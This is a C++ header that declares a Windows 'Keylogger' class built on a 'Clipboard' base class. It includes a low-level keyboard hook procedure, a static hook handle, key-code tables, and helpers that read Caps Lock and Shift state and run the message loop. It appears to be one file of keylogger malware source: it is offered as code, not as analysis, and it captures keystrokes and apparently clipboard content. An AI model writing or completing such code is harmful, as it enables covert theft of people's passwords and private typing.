#pragma once

#include <Windows.h>

#include "Clipboard.h"

/*
	Can't be inside the Keylogger class because of HOOKPROC definition
*/
LRESULT CALLBACK ProcKeyboard(int nCode, WPARAM wParam, LPARAM lParam);

class Keylogger: public Clipboard {
public:
	Keylogger();
	~Keylogger();

	inline bool IsCapslockToggle() {
		return GetKeyState(VK_CAPITAL) & 1;
	}

	inline bool IsShiftDown() {
		return GetAsyncKeyState(VK_LSHIFT) < 0 || GetAsyncKeyState(VK_RSHIFT) < 0;
	}

	inline void Update() {
		if(!GetMessageA(&msg, nullptr, 0, 0)) {
			this->~Keylogger();
		}
	}

private:
	static std::vector<std::string> vkCodesAll;
	static HHOOK hookKeyboard;
	static MSG msg;
};